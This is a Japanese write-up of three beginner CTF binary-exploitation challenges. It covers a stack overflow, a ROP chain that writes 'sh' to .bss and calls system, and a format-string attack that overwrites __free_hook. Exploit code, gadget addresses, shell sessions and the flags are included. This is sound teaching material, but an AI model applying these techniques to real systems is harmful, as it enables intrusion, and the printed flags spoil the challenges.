SECCON BeginnersCTF 2018 pwn問題のwriteupです。
  
* [[Warmup] condition 85 point](#condition)
* [BBS 304 point](#bbs)
* [Seczon 388 point](#seczon)
  
***
<a name="condition"></a>
# [Warmup] condition 85 point

## Question

```
あなたは flag にアクセスする権限を持っていますか？
Host: pwn1.chall.beginners.seccon.jp
Port: 16268
```
## Solution
実行すると名前の入力を求められる。適当に入れるとパーミッションないとのこと。
```S
$ ./condition 
Please tell me your name...AAAAAAAAAAA
Permission denied

```

objdumpでmain関数をみてみる。`gets`で入力した値と0xdeadbeefを比較して同一であればフラグが表示される。
```
0000000000400771 <main>:
  400771:	55                   	push   rbp
  400772:	48 89 e5             	mov    rbp,rsp
  400775:	48 83 ec 30          	sub    rsp,0x30
  400779:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  400780:	bf d8 08 40 00       	mov    edi,0x4008d8
  400785:	b8 00 00 00 00       	mov    eax,0x0
  40078a:	e8 71 fe ff ff       	call   400600 <printf@plt>
  40078f:	48 8d 45 d0          	lea    rax,[rbp-0x30]
  400793:	48 89 c7             	mov    rdi,rax
  400796:	b8 00 00 00 00       	mov    eax,0x0
  40079b:	e8 80 fe ff ff       	call   400620 <gets@plt>
  4007a0:	81 7d fc ef be ad de 	cmp    DWORD PTR [rbp-0x4],0xdeadbeef <---- ここで比較している
  4007a7:	75 16                	jne    4007bf <main+0x4e>
  4007a9:	bf f8 08 40 00       	mov    edi,0x4008f8
  4007ae:	e8 0d fe ff ff       	call   4005c0 <puts@plt>
  4007b3:	bf 1e 09 40 00       	mov    edi,0x40091e
  4007b8:	e8 16 00 00 00       	call   4007d3 <read_file>
  4007bd:	eb 0a                	jmp    4007c9 <main+0x58>
  4007bf:	bf 27 09 40 00       	mov    edi,0x400927
  4007c4:	e8 f7 fd ff ff       	call   4005c0 <puts@plt>
  4007c9:	bf 00 00 00 00       	mov    edi,0x0
  4007ce:	e8 6d fe ff ff       	call   400640 <exit@plt>
```

`gets`の入力はrbp-0x30から始まり、0xdeadbeefとの比較はrbp-0x4の値とおこなわれる。0x30-0x4 = 44バイトなので、44バイト適当にパディングして、0xdeadbeefを入力する。

```S
$ python -c 'print "\x00"*44+"\xef\xbe\xad\xde"'|nc pwn1.chall.beginners.seccon.jp 16268
Please tell me your name...OK! You have permission to get flag!!
ctf4b{T4mp3r_4n07h3r_v4r14bl3_w17h_m3m0ry_c0rrup710n}
```

***
<a name="bbs"></a>
# BBS 304 point

## Question
```
最近，BBSって言って掲示板だと伝わる人はどれくらいいるのでしょうね．

Host: pwn1.chall.beginners.seccon.jp
Port: 18373
```

## Solution
日付と入力したコンテンツを表示するバイナリ。
```S
$ ./bbs 
Input Content : AAAAAAAAAAAAA

==============================

2018年  5月 27日 日曜日 14:12:36 JST
AAAAAAAAAAAAA

==============================
```

checksecは以下のとおり、stack canaryがない。
```S
$ checksec --file bbs 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	FORTIFY	Fortified Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No	0		4	bbs
```

このバイナリでも`gets`を使っておりスタック・バッファオーバーフローが起きる。144バイト入力したところでcoreを見てみると、4006f9のret命令実行直前でrspに`0x4141414141414141`がある。つまりreturn addressまで136バイトのオフセットであることが分かる。
```S
$ python -c 'print "A"*144'|./bbs 
Input Content : 
==============================

2018年  5月 27日 日曜日 14:19:35 JST
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

==============================
Segmentation fault (コアダンプ)
$ gdb -q -c core
GEF for linux ready, type `gef' to start, `gef config' to configure
62 commands loaded for GDB 7.11.1 using Python engine 3.5
[*] 5 commands could not be loaded, run `gef missing` to know why.
[New LWP 1982]
Core was generated by `./bbs'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x00000000004006f9 in ?? ()
gef➤  x/10xg $rsp
0x7ffefc5c5638:	0x4141414141414141	0x0000000000000000
0x7ffefc5c5648:	0x00007ffefc5c5718	0x0000000100000000
0x7ffefc5c5658:	0x00000000004006a1	0x0000000000000000
0x7ffefc5c5668:	0xc15e05c604a5dea7	0x0000000000400590
0x7ffefc5c5678:	0x00007ffefc5c5710	0x0000000000000000
gef➤  
```

あとはROPをおこなっていく。pltセクションに`system`があるので、`system("sh")`を実行するROPチェーンを作る。すなわち、`sh`の文字列があるアドレスがメモリー上の静的な場所にあれば、それをrdiにセットして`system`を呼べばシェルを獲れる。ただgdbで見た感じバイナリには`sh`文字列はなかった。
```S
$ gdb -q bbs
gef➤  start
gef➤  grep sh
[+] Searching 'sh' in memory
[+] In '/lib/x86_64-linux-gnu/libc-2.23.so'(0x7ffff7a0d000-0x7ffff7bcd000), permission=r-x
  0x7ffff7a1e91c - 0x7ffff7a1e921  →   "shell" 
```

PIEが無効な環境では.bssセクションは静的な領域なため、これを書き込み先として利用する。`gets`で`sh`文字列を.bssセクションに書いて、その後`system`を呼ぶようなROPチェーンにすればよい。
ROPに必要な`pop rdi`ガジェット、.bssセクションのアドレス、`gets`と`system`のアドレスを求めておく。

* `pop rdi`ガジェット
```S
$ rp-lin-x64 -r 3 --file bbs |grep "pop rdi"
0x00400763: pop rdi ; ret  ;  (1 found)
```

* .bssセクションのアドレス
```S
$ readelf -a bbs |grep bss
  [26] .bss              NOBITS           0000000000601058  00001058
   03     .init_array .fini_array .jcr .dynamic .got .got.plt .data .bss 
    67: 0000000000601058     0 NOTYPE  GLOBAL DEFAULT   26 __bss_start
```

* `gets`と`system`のアドレス
```S
$ objdump -M intel -d bbs |grep gets
  4004f8:	e8 83 00 00 00       	call   400580 <gets@plt+0x10>
0000000000400570 <gets@plt>:
  4006c4:	e8 a7 fe ff ff       	call   400570 <gets@plt>

$ objdump -M intel -d bbs |grep system
0000000000400540 <system@plt>:
  4006d8:	e8 63 fe ff ff       	call   400540 <system@plt>
```

ROPチェーンを下記のようにしておけばよい。
```P
    system = 0x0000000000400540
    gets = 0x0000000000400570
    bss = 0x0000000000601058
    poprdi = 0x00400763

    buf = "A"*136
    buf += p(poprdi)
    buf += p(bss)
    buf += p(gets)
    buf += p(poprdi)
    buf += p(bss)
    buf += p(system)
    f.write(buf+"\n")
    f.write("sh\0\n") # getsによる.bssセクションへのsh文字列書き込み
```

[exp_bbs.py](https://github.com/kank3n/writeups/blob/master/seccon_b2018/exp_bbs.py)
```S
$ python exp_bbs.py -r
Input Content : 
==============================

Sun May 27 14:54:13 JST 2018
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAc@

==============================
id
uid=20249 gid=20000(bbs) groups=20000(bbs)
ls
bbs
flag.txt
cat flag.txt
ctf4b{Pr3p4r3_4rgum3n75_w17h_ROP_4nd_c4ll_4rb17r4ry_func710n5}
```

***
<a name="seczon"></a>
# Seczon 388 point

## Question
```
オンラインショッピング機能の模型を作成しました。脆弱性がないか検査してみてください。

Host: pwn1.chall.beginners.seccon.jp
Port: 21735
```

バイナリ・ファイルとlibcも与えられる。

## Solution

バイナリは32bit。checksecを見たところセキュリティー機構が厳しく設定されている。Full RELROなのでGOT Overwriteは出来ないし、PIEが有効なので.textセクションもrandomizeされる。
```
$ checksec --file seczon 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	FORTIFY	Fortified Fortifiable  FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   Yes	0		6	seczon
```

とりあえず適当に動かしてみるとcommentメニューのconfirmationの際にformat string bugが見つかった。`printf`にユーザーからの入力値をそのまま渡すようになっている場合に発生するバグで、スタック上や任意のアドレスにあるメモリー内容のリーク、また任意アドレスへの書き込みが出来てしまう。

なお、このバグを疑ってかかる場合`%p %p %p %p`とか適当に入力して試せばよい。
```
$ ./seczon
+---------------------+
|      Seczon.com     |
+---------------------+
|1) Add a item        |
|2) Comment a item    |
|3) Show a item       |
|4) Delete a item     |
+---------------------+
Action:
>> 1
Input item name
>> aaaa
Action:
>> 2
Choose item ID
>> 0
Input a comment
>> BBBAAAA %p %p %p %p %p %p %p
Confirmation
aaaa
BBBAAAA 0x23 0xf7fb85a0 0x56555cad 0xf7fb8000 (nil) 0x42424218 0x41414141
Action:
>> 
```

上記見ると`0xf7fb85a0`はlibcのアドレスっぽいし、`0x56555cad`は.textセクションのアドレスのようである。デバッガで確認すると、`0xf7fb85a0`はlibcの`_IO_2_1_stdin`のアドレスで、`0x56555cad`はcomment関数内のアドレスであることがわかった。
```
gef➤  x/xw 0xf7fb85a0
0xf7fb85a0 <_IO_2_1_stdin_>:	0xfbad208b
gef➤  x/xw 0x56555cad
0x56555cad <comment+38>:	0x83cc4589
gef➤  
```

libcと.textのアドレスをリークできるので、事前にオフセットを確認してリークしたアドレスから実アドレスを求めればASLR及びPIEをバイパスできることがわかった。libcをリークできるので、後述するが`system`関数を動的に求めることができる。

次にどうやって`system("sh")`を呼び出すかを考える。よくよくIDAやgdbを使ってみているとプログラム終了時にヒープ領域を`free`で解放しているコードがあった。

* IDA  
![2018-05-27 19 02 18](https://user-images.githubusercontent.com/9530961/40584711-93ca5bec-61e0-11e8-8160-153d94398bc4.png)

* gdb 該当箇所でブレーク  
`free`の引数にヒープのアドレス（1番目のアイテムがある場所）が渡っている。
```G
[-------------------------------------code-------------------------------------]
   0x56555b1c <fin+6>:	mov    eax,ds:0x5655804c
   0x56555b21 <fin+11>:	sub    esp,0xc
   0x56555b24 <fin+14>:	push   eax
=> 0x56555b25 <fin+15>:	call   0xf7e78750 <free>
   0x56555b2a <fin+20>:	add    esp,0x10
   0x56555b2d <fin+23>:	nop
   0x56555b2e <fin+24>:	leave  
   0x56555b2f <fin+25>:	ret
Guessed arguments:
arg[0]: 0x56559008 --> 0x61616161 ('aaaa')
arg[1]: 0xf7fb83dc --> 0xf7fb91e0 --> 0x0 
[------------------------------------stack-------------------------------------]
0000| 0xffffd240 --> 0x56559008 --> 0x61616161 ('aaaa') <--- ヒープのアドレス（1番目のアイテムがある場所）
0004| 0xffffd244 --> 0xf7fb83dc --> 0xf7fb91e0 --> 0x0 
0008| 0xffffd248 --> 0xffffd2d8 --> 0xf7fb91e0 --> 0x0 
0012| 0xffffd24c --> 0xf7fe9a03 (add    esp,0x10)
0016| 0xffffd250 --> 0xf7ffd4e4 --> 0x0 
0020| 0xffffd254 --> 0xf7fb8da7 --> 0xfb98700a 
0024| 0xffffd258 --> 0xffffd2d8 --> 0xf7fb91e0 --> 0x0 
0028| 0xffffd25c --> 0xf7fe9a74 (sub    esi,0x1)
[------------------------------------------------------------------------------]
```

Partial RELROの場合、GOT Overwriteで`free`を`system`に書き換え、1番目のアイテムの名前に`sh`文字列を書いておけば、プログラム終了時に`system("sh")`が呼ばれる。しかし今回のバイナリはFull RELROのためGOT Overwriteは出来ない。よって`__free_hook`に`system`のアドレスを書き込んでおき、`free`が呼ばれた時に`system`を実行できるようにした。

`__free_hook`はlibcのメモリー領域にあるので、これも事前にオフセットを確認しておけば動的に求めることができる。よって下記手順にてエクスプロイトを作っていくことにした。.textセクションのリークは不要になった。

1. fsbでlibcのアドレス(`_IO_2_1_stdin`のアドレス)をリーク
2. リークしたアドレスから`_IO_2_1_stdin`のオフセットを減算してlibcのベースアドレスを求める
3. libcのベースアドレスと`system`のオフセット、`__free_hook`のオフセットを各々加算して、`system`と`__free_hook`を動的に求める
4. fsbで`system`を`__free_hook`に書き込む
5. メニュー画面で1〜4以外のキー入力をしてプログラムを終了させる = `free`が呼ばれる

またfsbによるメモリー内容のリークや任意アドレスへの書き込みは下記サイトが役に立つので適宜参照しながらエクスプロイトを作っていった。  
[fsbの資料](https://gist.github.com/hhc0null/08c43983b4551f506722)

```P
    add("sh"+"A\0") # 1番目のアイテムにshを書いておく、末尾がnullされるので適応な文字"A"を追加
    comment("0","BBBAAAA %p %p %p %p %p %p %p") # fsbによりスタックをリーク

    # leak libc
    read_until(f,"AAAA ")
    read_until(f," 0x")
    libc = int(f.read(8),16) - _IO_2_1_stdin_offset  # libcベースアドレスを計算
    print "libc: ",hex(libc)
    system = libc + system_offset   # systemを計算
    print "system: ",hex(system)
    free_hook = libc + free_hook_offset  # __free_hookを計算
    print "free_hook: ",hex(free_hook)
    
    # set system in __free_hook
    system1 = u(p(system)[:2]+"\x00"*2)
    print hex(system1)
    system2 = u(p(system)[2:]+"\x00"*2)
    print hex(system2)
    comment("0","%"+str(system1)+"x%10$hn%"+"P"+p(free_hook))    # systemのアドレスを2バイトづつ__free_hookに書き込む
    comment("0","%"+str(system2)+"x%10$hn%"+"P"+p(free_hook+2))

    # trigger free
    f.write("\n")

```

[exp_seczon.py](https://github.com/kank3n/writeups/blob/master/seccon_b2018/exp_seczon.py)

```
$ python exp_seczon.py -r
libc:  0xf7609000
system:  0xf7643da0
free_hook:  0xf77bc8b0
0x3da0
0xf764
 Confirmation
sh


Action:
>>   
id
uid=30125 gid=30000(seczon) groups=30000(seczon)
ls
flag.txt
seczon
cat flag.txt
ctf4b{F0rm4t_5tr!ng_Bug_w!th_4lr3ady_pr!nt3d_d4t4}
```
